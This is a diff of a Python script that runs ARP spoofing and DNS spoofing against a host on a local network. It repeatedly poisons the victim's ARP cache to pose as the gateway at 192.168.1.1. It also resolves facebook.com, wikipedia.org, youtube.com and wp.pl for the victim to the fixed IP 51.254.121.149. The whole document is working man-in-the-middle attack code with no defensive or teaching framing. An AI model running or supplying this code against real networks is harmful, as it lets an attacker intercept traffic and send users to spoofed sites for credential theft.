@@ -1,12 +1,16 @@
 import time
+import signal
 import multiprocessing
+
 import dnsspoofer
+
 
 class ArpSpoofer(multiprocessing.Process):
     def __init__(self):
-        super().__init__()
+        super(ArpSpoofer, self).__init__()
         self.exit = multiprocessing.Event()
     def run(self):
+        signal.signal(signal.SIGINT, lambda signal, frame: self.terminate())
         while not self.exit.is_set():
             # gateway's IP and victim's mac addr
             dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1", b"em1")
@@ -22,12 +26,13 @@ arp_porcess.start()
 
 def spoof_dns():
     victims = {
-        "192.168.1.100":(
-            "192.168.1.1", #gateway IP
+        u"192.168.1.100":(
+            u"192.168.1.1", #gateway IP
             {
-                "facebook.com": "51.254.121.149",
-                "m.facebook.com": "51.254.121.149",
-                "wp.pl": "51.254.121.149"
+                u"wikipedia.org": u"51.254.121.149",
+                u"wikipedia.com": u"51.254.121.149",
+                u"youtube.com": u"51.254.121.149",
+                u"wp.pl": u"51.254.121.149"
             }
         )
     }
